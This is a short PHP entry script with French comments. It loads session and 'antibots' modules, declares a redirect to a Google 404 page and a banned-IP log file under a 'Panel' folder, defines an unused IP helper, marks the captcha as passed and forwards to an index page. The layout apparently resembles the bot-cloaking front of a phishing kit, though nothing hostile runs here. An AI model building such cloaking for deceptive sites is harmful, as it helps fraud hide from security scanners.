<?php
require_once './modules/sessions.php';        // Démarrage ou récupération sessions + cookies
require_once './antibots/all.php';            // Initialisation antibots

// URL de redirection si IP bannie
$url = 'https://google.com/404';

// Chemin vers fichier contenant IPs bannies
const BANNED_IPS_FILE = './Panel/logs/ip_ban.txt';

// Fonction pour récupérer l’IP utilisateur

if (!function_exists('getUserIP')) {
function getUserIP(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            return trim(end($ipList));
        }
    }
    return 'UNKNOWN';
}
}


$_SESSION['captcha_valide'] = true;

header('Location: ./pages/index.php');
exit;
